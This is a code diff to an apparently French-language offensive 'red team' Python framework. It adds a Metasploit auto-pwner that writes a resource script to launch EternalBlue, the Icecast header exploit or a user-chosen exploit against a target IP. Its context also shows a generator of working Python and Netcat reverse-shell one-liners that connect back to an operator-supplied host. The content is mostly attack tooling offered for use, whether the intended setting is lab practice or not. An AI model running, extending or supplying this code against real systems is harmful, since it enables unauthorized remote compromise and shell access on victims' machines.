@@ -244,8 +244,60 @@ def run_payload_generator():
     table.add_row("Python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{int(port)}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
     table.add_row("Netcat", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
     console.print(table)
-    
 
+# --- ÉTAPE 8 : METASPLOIT AUTO-PWNER ---
+def metasploit_autopwn(ip):
+    console.print("\n[bold red]🎯 AUTO-PWN METASPLOIT 🎯[/bold red]")
+    
+    choix = questionary.select(
+        "Choisis ton missile automatique :",
+        choices=[
+            "1. Icecast Header (CVE-2004-1561) - Port 8000",
+            "2. EternalBlue (MS17-010) - Port 445",
+            "3. Exploit sur mesure (Manuel)",
+            "4. Retour"
+        ]
+    ).ask()
+    
+    if not choix or "4." in choix:
+        return
+
+    lhost = questionary.text("Ton interface VPN ou IP (ex: tun0) :", default="tun0").ask()
+    
+    exploit_path = ""
+    rport = ""
+    
+    if "1." in choix:
+        exploit_path = "exploit/windows/http/icecast_header"
+        rport = "8000"
+    elif "2." in choix:
+        exploit_path = "exploit/windows/smb/ms17_010_eternalblue"
+        rport = "445"
+    elif "3." in choix:
+        exploit_path = questionary.text("Chemin exact de l'exploit :").ask()
+        rport = questionary.text("Port cible (RPORT) :").ask()
+
+    console.print(f"\n[bold yellow][*] Armement du missile sur {ip}...[/bold yellow]")
+    
+    # Création du script de lancement automatique pour Metasploit
+    rc_file = "autopwn.rc"
+    with open(rc_file, "w") as f:
+        f.write(f"use {exploit_path}\n")
+        f.write(f"set RHOSTS {ip}\n")
+        if rport:
+            f.write(f"set RPORT {rport}\n")
+        f.write(f"set LHOST {lhost}\n")
+        f.write("show options\n")
+        f.write("echo -e '\\n\\033[1;32m[*] CIBLE VEROUILLÉE ! TAPE \"run\" POUR FAIRE FEU !\\033[0m\\n'\n")
+    
+    console.print("[bold green][+] Lancement de Metasploit avec les paramètres injectés...[/bold green]")
+    try:
+        # Lance Metasploit silencieusement (-q) et execute le script (-r)
+        subprocess.run(["msfconsole", "-q", "-r", rc_file])
+    except Exception as e:
+        console.print(f"[bold red]Erreur lors du lancement de Metasploit : {e}[/bold red]")
+
+    
 # --- MENU PRINCIPAL (INTERACTIF) ---
 def interactive_menu(ip, open_ports):
     while True:
@@ -266,7 +318,8 @@ def interactive_menu(ip, open_ports):
                 "4. Bruteforce (Hydra)",
                 "5. Usine à Reverse Shells (Super C2 Pwncat)",
                 "6. Aide Escalade de Privilèges (SUID)",
-                "7. Générer Rapport & Quitter"
+                "7. Metasploit Auto-Pwner (Armement auto)",
+                "8. Générer Rapport & Quitter"
             ]
         ).ask()
         
@@ -278,13 +331,14 @@ def interactive_menu(ip, open_ports):
         elif "4." in choix: run_hydra(ip, open_ports)
         elif "5." in choix: run_payload_generator()
         elif "6." in choix: run_suid_helper()
-        elif "7." in choix: 
+        elif "7." in choix: metasploit_autopwn(ip)
+        elif "8." in choix: 
             generer_html()
             break
 
 if __name__ == "__main__":
     auto_update()
-    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V16.2[/bold red]", subtitle="Elite Red Team Edition"))
+    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V16.6[/bold red]", subtitle="Elite Red Team Edition"))
     
     cible = ""
     # Si on lance avec l'IP directement en argument (ex: cyber 192.168.1.1)
